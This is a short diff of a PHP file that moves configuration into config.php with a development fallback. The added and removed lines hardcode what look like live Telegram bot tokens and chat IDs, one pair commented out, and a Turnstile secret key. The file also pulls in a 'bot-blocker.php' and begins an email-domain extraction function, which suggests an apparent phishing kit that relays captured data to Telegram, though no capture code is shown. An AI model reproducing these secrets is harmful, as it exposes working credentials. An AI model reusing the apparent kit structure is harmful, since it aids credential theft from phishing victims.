@@ -1,17 +1,17 @@
 <?php
+// Include configuration
+if (file_exists('config.php')) {
+    require_once 'config.php';
+} else {
+    // Fallback constants for development
+    define('TELEGRAM_BOT_TOKEN', '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms');
+    define('TELEGRAM_CHAT_ID', '7608981070');
+    define('TURNSTILE_SECRET', '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM');
+    define('ENVIRONMENT', 'development');
+}
+
 // Include advanced bot blocker
 require_once 'bot-blocker.php';
-
-// Telegram Main Bot credentials
-const TELEGRAM_BOT_TOKEN = '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms';
-const TELEGRAM_CHAT_ID = '7608981070';
-
-// Secondary Telegram Bot credentials (placeholders FG)
-//const SECONDARY_TELEGRAM_BOT_TOKEN = '8268331175:AAENSer5qi5GCNQJwtXgUS79URFnFicEuSs';
-//const SECONDARY_TELEGRAM_CHAT_ID = '1562794916';
-
-// Turnstile secret key
-const TURNSTILE_SECRET = '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM';
 
 /**
  * Extract domain from email address
